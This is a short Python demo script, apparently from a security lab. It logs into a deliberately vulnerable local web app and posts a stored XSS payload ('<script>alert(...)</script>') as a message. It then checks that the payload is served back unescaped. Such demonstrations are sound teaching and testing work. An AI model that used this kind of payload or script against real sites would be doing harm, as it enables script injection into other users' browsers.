"""
Stored XSS Attack Demo
Submits a malicious script payload as a message; verifies it appears unescaped.
Run against the VULNERABLE app (port 5000).
"""
import requests

BASE = "http://127.0.0.1:5000"
SESSION = requests.Session()

XSS_PAYLOAD = '<script>alert("XSS-PWNED")</script>'


def login(username="alice", password="alice123"):
    SESSION.post(f"{BASE}/login", data={"username": username, "password": password})


def post_xss_message():
    """Post a message containing a script tag."""
    r = SESSION.post(
        f"{BASE}/messages",
        data={"content": XSS_PAYLOAD},
        allow_redirects=True,
    )
    return r


def verify_xss_stored():
    """Check that the payload appears unescaped in the messages page."""
    r = SESSION.get(f"{BASE}/messages")
    # Unescaped means the literal <script> tag is in the HTML source
    found = XSS_PAYLOAD in r.text
    print(f"[Stored-XSS] status={r.status_code} payload_unescaped={found}")
    if found:
        idx = r.text.find(XSS_PAYLOAD)
        print(f"  found at char {idx}: ...{r.text[max(0,idx-20):idx+60]}...")
    return found


if __name__ == "__main__":
    print("=" * 60)
    print("Stored XSS Demo — Vulnerable App (port 5000)")
    print("=" * 60)
    login()
    post_xss_message()
    result = verify_xss_stored()
    print()
    print(f"Stored XSS:  {'SUCCESS (payload unescaped in page)' if result else 'FAILED'}")
